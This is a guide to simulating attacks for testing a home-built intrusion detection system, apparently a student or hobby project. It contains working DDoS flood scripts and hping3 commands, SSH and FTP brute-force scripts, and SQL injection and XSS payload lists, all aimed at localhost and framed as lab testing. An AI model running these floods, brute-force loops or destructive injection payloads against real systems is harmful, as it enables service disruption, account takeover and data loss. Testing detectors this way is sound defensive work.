# Attack Simulation Guide for Multi-Vector IDS

This guide provides methods to simulate different attack types for testing your IDS system.

## ⚠️ Important Warnings

**LEGAL NOTICE:** Only perform these simulations on:
- Your own systems/networks
- Lab environments you control
- With explicit written permission

**NEVER** attack systems you don't own or have authorization to test.

---

## 1. Benign Traffic (Normal Activity)

### Web Browsing
```bash
# Simple web requests
curl https://www.google.com
curl https://www.github.com
curl https://www.stackoverflow.com
```

### Continuous Traffic Generator
```powershell
# PowerShell - Generate normal HTTP traffic
while ($true) {
    Invoke-WebRequest -Uri "https://www.example.com" -UseBasicParsing
    Start-Sleep -Seconds 2
}
```

---

## 2. DDoS Attack Simulation

### Option A: hping3 (Recommended)

**Installation:**
1. Download Npcap (already installed for your IDS)
2. Download hping3 for Windows from: https://github.com/antirez/hping

**SYN Flood Attack:**
```bash
# Target your own local server
hping3 -S -p 80 --flood 127.0.0.1

# Rate-limited version (safer)
hping3 -S -p 80 --faster 127.0.0.1
```

**UDP Flood:**
```bash
hping3 --udp -p 53 --flood 127.0.0.1
```

### Option B: Python Script (Simple)

```python
# ddos_simulator.py
import socket
import threading
import time

TARGET_IP = "127.0.0.1"  # Your local machine
TARGET_PORT = 8000       # Your API server
DURATION = 30            # seconds

def send_packets():
    """Send rapid packets to simulate DDoS."""
    end_time = time.time() + DURATION
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while time.time() < end_time:
        try:
            sock.connect((TARGET_IP, TARGET_PORT))
            sock.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            pass

# Launch multiple threads
print(f"Starting DDoS simulation against {TARGET_IP}:{TARGET_PORT}")
threads = []
for i in range(50):  # 50 concurrent connections
    t = threading.Thread(target=send_packets)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("DDoS simulation complete")
```

**Run:**
```bash
python ddos_simulator.py
```

---

## 3. Brute Force Attack Simulation

### SSH Brute Force (if you have SSH server)

**Using Hydra:**
```bash
# Install from: https://github.com/vanhauser-thc/thc-hydra
hydra -l admin -P passwords.txt ssh://127.0.0.1
```

**Python Script:**
```python
# ssh_bruteforce_simulator.py
import paramiko
import time

HOST = "127.0.0.1"
PORT = 22
USERNAME = "testuser"
PASSWORDS = ["password", "123456", "admin", "test", "root"]

print(f"Starting SSH brute force simulation against {HOST}")

for password in PASSWORDS:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, port=PORT, username=USERNAME, password=password, timeout=3)
        print(f"[+] Success: {password}")
        client.close()
        break
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {password}")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    time.sleep(0.5)  # Delay between attempts

print("Brute force simulation complete")
```

### FTP Brute Force

```python
# ftp_bruteforce_simulator.py
from ftplib import FTP
import time

HOST = "127.0.0.1"
USERNAME = "testuser"
PASSWORDS = ["password", "123456", "admin", "ftp", "test"]

print(f"Starting FTP brute force simulation against {HOST}")

for password in PASSWORDS:
    try:
        ftp = FTP()
        ftp.connect(HOST, 21, timeout=3)
        ftp.login(USERNAME, password)
        print(f"[+] Success: {password}")
        ftp.quit()
        break
    except Exception as e:
        print(f"[-] Failed: {password}")
    
    time.sleep(0.5)

print("Brute force simulation complete")
```

---

## 4. Web Attack Simulation

### SQL Injection

**Using curl:**
```bash
# SQL injection attempts
curl "http://localhost:8000/?id=1' OR '1'='1"
curl "http://localhost:8000/?id=1; DROP TABLE users--"
curl "http://localhost:8000/?user=admin'--"
curl "http://localhost:8000/?search=' UNION SELECT * FROM users--"
```

**Python Script:**
```python
# sqli_simulator.py
import requests
import time

TARGET = "http://localhost:8000"
PAYLOADS = [
    "' OR '1'='1",
    "1' OR '1'='1'--",
    "' UNION SELECT NULL--",
    "1; DROP TABLE users--",
    "admin'--",
    "' OR 1=1--",
    "1' AND '1'='1",
]

print(f"Starting SQL Injection simulation against {TARGET}")

for payload in PAYLOADS:
    try:
        url = f"{TARGET}/?id={payload}"
        response = requests.get(url, timeout=3)
        print(f"[*] Payload: {payload} | Status: {response.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    time.sleep(1)

print("SQL Injection simulation complete")
```

### XSS (Cross-Site Scripting)

```python
# xss_simulator.py
import requests
import time

TARGET = "http://localhost:8000"
PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
]

print(f"Starting XSS simulation against {TARGET}")

for payload in PAYLOADS:
    try:
        response = requests.post(TARGET, data={"comment": payload}, timeout=3)
        print(f"[*] Payload: {payload[:30]}... | Status: {response.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    time.sleep(1)

print("XSS simulation complete")
```

---

## 5. Comprehensive Attack Simulation Script

```python
# comprehensive_attack_simulator.py
"""
Comprehensive attack simulator for IDS testing.
Simulates all attack types in sequence.
"""

import requests
import socket
import threading
import time
from datetime import datetime

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8000
TARGET_URL = f"http://{TARGET_IP}:{TARGET_PORT}"

def log(message):
    """Print timestamped log message."""
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")

def simulate_benign_traffic(duration=30):
    """Simulate normal web traffic."""
    log("Starting benign traffic simulation...")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            requests.get(TARGET_URL, timeout=2)
            time.sleep(2)
        except:
            pass
    
    log("Benign traffic simulation complete")

def simulate_ddos(duration=30):
    """Simulate DDoS attack."""
    log("Starting DDoS simulation...")
    
    def flood():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((TARGET_IP, TARGET_PORT))
                sock.send(b"GET / HTTP/1.1\r\n\r\n")
                sock.close()
            except:
                pass
    
    threads = [threading.Thread(target=flood) for _ in range(20)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    log("DDoS simulation complete")

def simulate_web_attacks():
    """Simulate web attacks (SQLi, XSS)."""
    log("Starting web attack simulation...")
    
    payloads = [
        "' OR '1'='1",
        "1; DROP TABLE users--",
        "<script>alert('XSS')</script>",
        "' UNION SELECT NULL--",
    ]
    
    for payload in payloads:
        try:
            requests.get(f"{TARGET_URL}/?q={payload}", timeout=2)
            time.sleep(1)
        except:
            pass
    
    log("Web attack simulation complete")

def main():
    """Run all attack simulations."""
    log("="*60)
    log("COMPREHENSIVE ATTACK SIMULATION")
    log("="*60)
    log(f"Target: {TARGET_URL}")
    log("="*60)
    
    # 1. Benign traffic
    simulate_benign_traffic(20)
    time.sleep(5)
    
    # 2. DDoS attack
    simulate_ddos(30)
    time.sleep(5)
    
    # 3. Web attacks
    simulate_web_attacks()
    time.sleep(5)
    
    log("="*60)
    log("ALL SIMULATIONS COMPLETE")
    log("Check your IDS dashboard for detected attacks!")
    log("="*60)

if __name__ == "__main__":
    main()
```

**Run:**
```bash
python comprehensive_attack_simulator.py
```

---

## 6. Using PCAP Files (Recommended for Testing)

### Download Sample Attack PCAPs

**CICIDS2017 Dataset:**
- Already contains real attack traffic
- Download from: https://www.unb.ca/cic/datasets/ids-2017.html

**Use your trained model's test data:**
```bash
# The model was trained on CICIDS2017, so it will recognize these patterns
# Copy sample PCAPs to your project
mkdir data\sample_pcaps
# Add .pcap files here
```

**Upload via API:**
```bash
curl -X POST "http://localhost:8000/api/capture/pcap/upload" \
  -F "file=@data/sample_pcaps/attack.pcap"
```

---

## 7. Monitoring Results

### Check Dashboard
- Open: http://localhost:5173
- Watch the **Alerts** tab for real-time detections
- Check **Statistics** for attack distribution

### Check API
```bash
# Get recent alerts
curl http://localhost:8000/api/alerts

# Get statistics
curl http://localhost:8000/api/statistics

# Export to CSV
curl http://localhost:8000/api/export/csv
```

---

## Quick Start Recommendation

**For immediate testing:**

1. **Start with benign traffic:**
   ```powershell
   while ($true) { Invoke-WebRequest -Uri "http://localhost:8000/health"; Start-Sleep 1 }
   ```

2. **Then simulate DDoS:**
   ```python
   # Save as test_ddos.py
   import requests, threading
   def flood():
       for _ in range(100):
           try: requests.get("http://localhost:8000")
           except: pass
   
   threads = [threading.Thread(target=flood) for _ in range(10)]
   for t in threads: t.start()
   for t in threads: t.join()
   ```

3. **Watch your dashboard** at http://localhost:5173 for alerts!

---

## Troubleshooting

### No Alerts Appearing
- Ensure model is loaded (check dashboard)
- Verify capture is running
- Check that traffic is going through the monitored interface
- Try more aggressive attacks (higher rate)

### Too Many False Positives
- Model may need retraining with better data
- Adjust confidence thresholds in predictor

### Performance Issues
- Reduce attack rate
- Check CPU/memory usage
- Ensure Npcap is properly installed

---

## Safety Notes

- Always test on localhost (127.0.0.1) or isolated lab networks
- Don't overwhelm your own system
- Stop simulations if system becomes unresponsive
- Keep attack durations short (30-60 seconds)
- Monitor system resources during testing
